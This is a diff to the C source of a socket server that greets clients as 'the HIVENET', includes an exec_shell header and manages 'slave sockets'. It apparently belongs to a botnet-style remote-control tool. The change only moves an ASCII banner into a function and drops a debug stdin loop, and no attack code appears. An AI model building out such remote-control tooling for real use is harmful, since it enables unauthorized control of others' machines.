@@ -9,6 +9,7 @@
 #include "fatal.h"
 #include "hexdump.h"
 #include "exec_shell.h"
+#include "banner.h"
 
 #define PORT 9090
 
@@ -25,17 +26,7 @@ int main() {
     int debug = 1;
     fd_set readfds;    // SET FILE DESCRIPTORS FOR FUTURE CONNECTIONS
 
-    printf(R"EOF(
-        8888888888P         d8888  88888888888  .d88888b.   .d8888b.
-              d88P         d88888      888     d88P' 'Y88b  d88P  Y88b
-             d88P         d88P888      888     888     888  Y88b.
-            d88P         d88P 888      888     888     888   'Y888b.
-           d88P         d88P  888      888     888     888      'Y88b.
-          d88P         d88P   888      888     888     888        '888
-         d88P         d8888888888      888     Y88b. .d88P  Y88b  d88P
-        d8888888888  d88P     888      888      'Y88888P'    'Y8888P'
-
-)EOF");
+    pbanner();
 
     char *message= "WELCOME TO THE HIVENET\n\r";
 
@@ -73,11 +64,6 @@ int main() {
         FD_ZERO(&readfds);                          // CLEAR FILE DESCRIPTOR FOR CLIENT
         FD_SET(server_socket, &readfds);            // ADD MASTER SOCKET TO FD
         max_sd = server_socket;
-
-        // CHECK FOR SERVER INPUT
-        while ((command = fgetc(stdin)) != EOF) {
-            printf("[%c]\n", command);
-        }
 
         // ADD SLAVE SOCKETS TO FD
         for(i = 0; i < max_clients; i++)
